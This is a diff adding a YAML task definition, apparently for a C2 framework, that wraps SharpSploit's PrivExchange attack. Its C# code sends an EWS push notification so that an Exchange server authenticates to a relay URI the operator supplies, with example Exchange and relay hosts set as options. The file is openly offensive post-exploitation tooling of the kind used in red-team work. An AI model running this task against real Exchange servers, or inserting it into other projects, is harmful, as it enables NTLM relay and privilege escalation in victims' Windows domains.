@@ -1,0 +1,111 @@
+- Name: PrivExchange
+  Aliases: []
+  Description: Performs the PrivExchange attack by sending a push notification to EWS.
+  Author: 
+      Name: Dennis Panagiotopoulos
+      Handle: den_n1s
+      Link: https://twitter.com/den_n1s
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+    using System;
+      
+    using SharpSploit.PrivilegeEscalation;
+    
+    public static class Task
+    {
+        public static string Execute(string EWSUri, string RelayUri, string ExchangeVersion = "Exchange2010")
+        {
+            Exchange.ExchangeVersion version = (Exchange.ExchangeVersion) Enum.Parse(typeof(Exchange.ExchangeVersion), ExchangeVersion, true);
+            if (Exchange.PrivExchangePushNotification(EWSUri, RelayUri, version))
+            {
+                return "PrivExchange succeeded!";
+            }
+            return "PrivExchange failed.";
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: EWSUri
+    Value: https://exchange.example.local:443/EWS/Exchange.asmx
+    DefaultValue: ''
+    Description: 'The URI of the Exchange EWS instance to perform the relay against. For example: http(s)://<hostname>:<port>/EWS/Exchange.asmx.'
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: RelayUri
+    Value: https://relay.example.local:443/relay
+    DefaultValue: ''
+    Description: The URI of the external relay of the Exchange authentication.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: ExchangeVersion
+    Value: Exchange2010
+    DefaultValue: ''
+    Description: Microsoft Exchange version. Defaults to Exchange2010.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit\SharpSploit\
+    Language: CSharp
+    CompatibleDotNetVersions: &o0
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Management.Automation.dll
+      Location: net35\System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40\System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40\System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40\System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40\System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net35\System.Management.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35\System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35\System.IdentityModel.dll
+      DotNetVersion: Net35
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
